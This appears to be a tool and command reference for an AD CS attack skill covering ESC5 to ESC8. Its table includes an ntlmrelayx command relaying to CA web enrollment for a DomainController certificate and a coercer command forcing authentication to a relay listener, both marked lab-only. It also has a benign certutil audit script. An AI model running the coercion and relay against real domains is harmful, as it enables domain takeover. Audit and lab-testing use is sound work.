# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`active-directory-certificate-services-esc5-through-esc8`](SKILL.md) | Family: **Network, Active Directory and Endpoint**

Entry points verified against current releases. Impacket, Certipy and netexec rename subcommands between minor versions; check `--help` before scripting.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `certutil` | `certutil -getreg policy\EditFlags` | CA policy flags including subject-name supply | Windows |
| `certutil` | `certutil -getreg CA\Security` | CA role assignments | Windows |
| `certipy` | `certipy find -u lowpriv@corp.example -p pass -dc-ip 10.20.30.10 -stdout` | CA and endpoint audit | Linux / Windows |
| `ntlmrelayx.py` | `ntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp -smb2support --adcs --template DomainController` | Relay to enrollment, authorised lab only | Linux |
| `PetitPotam` / `coercer` | `coercer coerce -t 10.20.30.10 -u lowpriv -p pass -d corp.example -l 10.20.30.99` | Coercion to a relay listener, lab only | Linux / Windows |

## Minimal Lab Validation Script

Read CA flags, roles and endpoint authentication; the relay itself is a separate authorised step and is not part of this probe.

```python
import subprocess

def reg(path):
    out = subprocess.run(["certutil", "-getreg", path], capture_output=True, text=True).stdout
    return [ln for ln in out.splitlines() if ln.strip()]

for path in ("policy\\EditFlags", "policy\\DisableExtensionList", "CA\\Security"):
    print(path)
    for line in reg(path)[:12]:
        print("  ", line)
```

## Flag Notes

- `-getreg policy\\EditFlags` is the direct read of the ESC6 condition.
- `-getreg CA\\Security` lists CA role holders, which is where ESC7 lives.
- `--adcs` makes the relay request a certificate rather than a session; it belongs only in an authorised lab.
